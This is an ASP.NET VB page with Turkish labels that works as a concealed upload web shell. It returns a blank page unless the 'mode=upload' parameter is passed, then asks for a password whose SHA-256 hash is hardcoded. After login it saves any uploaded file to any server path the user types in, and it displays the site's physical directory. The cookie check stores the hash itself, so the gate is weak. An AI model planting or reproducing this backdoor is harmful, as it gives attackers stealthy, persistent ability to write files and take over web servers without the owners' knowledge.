<%@ Page Language="vb" AutoEventWireup="false" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%If Request("mode") = "upload" Then%>
<html id="html" runat="server" visible="false">
<head>
    
</head>
<body>
    <style>
        body{
            font-family:Tahoma;
            font-size:12px;
        }
    </style>
    <form id="formUpload" runat="server">
    <div id="uploadDiv" runat="server" visible="false">
        <asp:TextBox id="curr_pth" disabled = "true" type="text" runat="server" style="height: 30px; width:600px;"></asp:TextBox><br/>
        <asp:TextBox id="pth" type="text" runat="server" style="height: 30px; width:600px;"></asp:TextBox><br/>
        <asp:FileUpload ID="DosyaUpload" runat="server" /><asp:Button ID="GonderButton" runat="server" Text="Gönder" />
        <br />
        <asp:Label ID="SonucLabel" runat="server" Text=""></asp:Label>
    </div>
        <div id="loginDiv" runat="server" visible="false">
            <asp:TextBox ID="ParolaTextBox" TextMode="Password" runat="server"></asp:TextBox><asp:Button ID="GirisButton" runat="server" Text="Giriş Yap" />
        </div>
    </form>


</body>
</html>
<%Else %>


<!DOCTYPE html>
<html>
 
</html>

<%End If %>
    <script language="vb" runat="server">
      
 Protected FormParolasi As String = "1b46d370bcd14b4b67f31733f03e0e266be70d8bfc0452df6ad8476598c35247"
        


        Public Function LoginKontrol() As Boolean
            Dim result As Boolean = False
            If HttpContext.Current.Request.Cookies("UploadFormC") IsNot Nothing Then
                Dim cerezdenGelen As String = Left(HttpContext.Current.Request.Cookies("UploadFormC").Value, 100)
                If cerezdenGelen = FormParolasi Then
                    result = True
                End If

            End If
            Return result
        End Function



        Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load

           If Request("mode") = "upload" Then
                html.Visible = True
                curr_pth.text = "Current: " & Server.MapPath(".") & "\"

                If LoginKontrol() Then
                    uploadDiv.Visible = True
                    loginDiv.Visible = False
                Else
                    uploadDiv.Visible = False
                    loginDiv.Visible = True
                End If
            Else
                html.Visible = False
                Response.Write("")
            End If 

        End Sub

        Protected Sub GirisButton_Click(sender As Object, e As EventArgs) Handles GirisButton.Click
            If SHA.GenerateSHA256String(ParolaTextBox.Text) = FormParolasi Then

                Dim myCookie As New HttpCookie("UploadFormC")
                myCookie.Value = FormParolasi
                HttpContext.Current.Response.Cookies.Add(myCookie)

                uploadDiv.Visible = True
                loginDiv.Visible = False
            End If
        End Sub

        Protected Sub GonderButton_Click(sender As Object, e As EventArgs) Handles GonderButton.Click
            If LoginKontrol() Then

                If DosyaUpload.HasFile Then
                    Dim p As String = Server.MapPath(".") & "\"
                    
                    DosyaUpload.SaveAs( pth.text & "\" & DosyaUpload.FileName)

                    SonucLabel.Text = DosyaUpload.FileName & " gönderildi"
                Else
                    SonucLabel.Text = "dosya seçmedin"
                End If

            Else
                SonucLabel.Text = "Giriş yapmanız lazım !"
            End If
        End Sub


        Public NotInheritable Class SHA

            Public Shared Function GenerateSHA256String(inputString As String) As String
                Dim sha256 As SHA256 = SHA256Managed.Create()
                Dim bytes As Byte() = Encoding.UTF8.GetBytes(inputString)
                Dim hash As Byte() = sha256.ComputeHash(bytes)
                Return GetStringFromHash(hash)
            End Function


            Private Shared Function GetStringFromHash(hash As Byte()) As String
                Dim result As New StringBuilder()
                For i As Integer = 0 To hash.Length - 1
                    result.Append(hash(i).ToString("X2"))
                Next
                Return result.ToString().ToLower()
            End Function

        End Class

    </script>
